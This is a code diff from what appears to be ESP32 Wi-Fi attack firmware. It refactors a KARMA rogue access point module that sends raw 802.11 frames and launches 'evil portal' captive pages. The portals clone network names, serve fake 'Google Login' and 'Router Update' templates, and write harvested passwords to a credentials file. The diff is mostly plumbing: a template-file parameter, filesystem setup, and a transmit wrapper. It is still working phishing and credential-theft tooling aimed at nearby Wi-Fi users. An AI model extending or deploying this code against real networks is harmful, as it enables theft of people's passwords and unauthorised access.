@@ -62,9 +62,9 @@ static bool sendRawFrameOnAp(const void *buffer, int len, uint8_t channel) {
     if (buffer == nullptr || len <= 0) return false;
     if (!ensureKarmaApInterface(channel)) return false;
 
-    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, buffer, len, false);
+    esp_err_t err = wifiRawTx(WIFI_IF_AP, buffer, len);
     if (err != ESP_OK) {
-        Serial.printf("[KARMA] esp_wifi_80211_tx failed: %s (%d)\n", esp_err_to_name(err), (int)err);
+        Serial.printf("[KARMA] wifiRawTx failed: %s (%d)\n", esp_err_to_name(err), (int)err);
         return false;
     }
 
@@ -1771,7 +1771,9 @@ void checkPortals() {
     lastPortalHeartbeat = now;
 }
 
-void launchBackgroundPortal(const String &ssid, uint8_t channel, const String &templateName) {
+void launchBackgroundPortal(
+    const String &ssid, uint8_t channel, const String &templateName, const String &templateFile
+) {
     if (activePortal != nullptr) return;
     if (ssid.isEmpty() || ssid == "*WILDCARD*") return;
 
@@ -1785,7 +1787,7 @@ void launchBackgroundPortal(const String &ssid, uint8_t channel, const String &t
     portal->clientFingerprint = 0;
     portal->portalId = generatePortalId(templateName);
 
-    portal->instance = new (std::nothrow) EvilPortal(ssid, channel, false, false, true, true);
+    portal->instance = new (std::nothrow) EvilPortal(ssid, channel, false, false, true, true, templateFile);
     if (portal->instance == nullptr) {
         delete portal;
         return;
@@ -1812,7 +1814,7 @@ void loadPortalTemplates() {
     portalTemplates.clear();
     portalTemplates.push_back({"Google Login", "", true, false});
     portalTemplates.push_back({"Router Update", "", true, true});
-    if (LittleFS.begin()) {
+    if (setupLittleFS()) {
         if (!LittleFS.exists("/PortalTemplates")) LittleFS.mkdir("/PortalTemplates");
         if (LittleFS.exists("/PortalTemplates")) {
             File root = LittleFS.open("/PortalTemplates");
@@ -1832,7 +1834,6 @@ void loadPortalTemplates() {
                 file = root.openNextFile();
             }
         }
-        LittleFS.end();
     }
     FS *fs = nullptr;
     if (getFsStorage(fs) && fs == &SD) {
@@ -1927,7 +1928,7 @@ bool selectPortalTemplate(bool isInitialSetup) {
              directOptions.push_back(
                  {"LittleFS", [=]() {
                       drawMainBorderWithTitle("BROWSE LITTLEFS");
-                      if (LittleFS.begin()) {
+                      if (setupLittleFS()) {
                           String templateFile = loopSD(LittleFS, true, "HTML", "/");
                           if (templateFile.length() > 0) {
                               PortalTemplate customTmpl;
@@ -1957,7 +1958,6 @@ bool selectPortalTemplate(bool isInitialSetup) {
                                   delay(1000);
                               }
                           }
-                          LittleFS.end();
                       } else {
                           displayTextLine("LittleFS error!");
                           delay(1000);
@@ -1988,7 +1988,7 @@ bool selectPortalTemplate(bool isInitialSetup) {
     return templateSelected;
 }
 
-void saveCredentialsToFile(String ssid, String password) {
+void saveCredentialsToFile(const String &ssid, const String &password) {
     FS *saveFs = nullptr;
     if (!getFsStorage(saveFs)) return;
     String filename = "/ProbeData/credentials.txt";
@@ -2010,7 +2010,7 @@ void saveCredentialsToFile(String ssid, String password) {
 
 void launchTieredEvilPortal(PendingPortal &portal) {
     Serial.printf("[TIER-%d] Launching background portal for %s\n", portal.tier, portal.ssid.c_str());
-    launchBackgroundPortal(portal.ssid, portal.channel, portal.templateName);
+    launchBackgroundPortal(portal.ssid, portal.channel, portal.templateName, portal.templateFile);
 
     if (portal.isCloneAttack) cloneAttacksLaunched++;
     else autoPortalsLaunched++;
@@ -2118,7 +2118,7 @@ void launchManualEvilPortal(const String &ssid, uint8_t channel, bool verifyPwd)
         return;
     }
     Serial.printf("[MANUAL] Launching background portal for %s (ch%d)\n", ssid.c_str(), channel);
-    launchBackgroundPortal(ssid, channel, selectedTemplate.name);
+    launchBackgroundPortal(ssid, channel, selectedTemplate.name, selectedTemplate.filename);
 }
 
 void handleBroadcastResponse(const String &ssid, const String &mac) {
